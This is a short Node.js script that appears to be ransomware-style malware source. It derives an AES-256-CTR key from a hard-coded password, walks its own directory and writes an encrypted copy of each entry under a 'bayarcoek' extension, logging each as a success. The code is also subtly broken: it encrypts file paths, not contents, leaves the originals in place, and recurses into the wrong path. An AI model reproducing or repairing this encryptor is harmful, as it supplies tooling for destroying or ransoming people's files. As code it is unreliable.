const fs = require('fs');
const crypto = require('crypto');
const algorithm = 'aes-256-ctr';
let key = 'osLqi3N3EFrs9';
key = crypto
  .createHash('sha256')
  .update(String(key))
  .digest('base64')
  .substr(0, 32);

const mode = process.argv[2];
const extension = process.argv[3] || 'bayarcoek';
let count = 0;
const path = __dirname + '/';

const encrypt = (buffer) => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  const result = Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
  return result;
};

const main = (dir) => {
  let files = fs.readdirSync(dir);
  files = files.filter(
    (file) => !/(^|\/)\.[^\/\.]/g.test(file) && file != 'bayarcoek.js'
  );
  files.forEach((file) => {
    const oldPath = `${dir}/${file}`;
    const newPath = `${oldPath}.${extension}`;
    const item = fs.statSync(oldPath);
    const plain = Buffer.from(oldPath);
    const encrypted = encrypt(plain);
    fs.writeFile(newPath, encrypted, (err) => {
      if (err) return console.err(err);
      console.log(
        `${++count}. ${oldPath.replace(path, '')} => ${newPath.replace(
          path,
          ''
        )} (SUCCESS)`
      );
      if (item.isDirectory()) main(newPath);
    });
  });
};

main(__dirname);
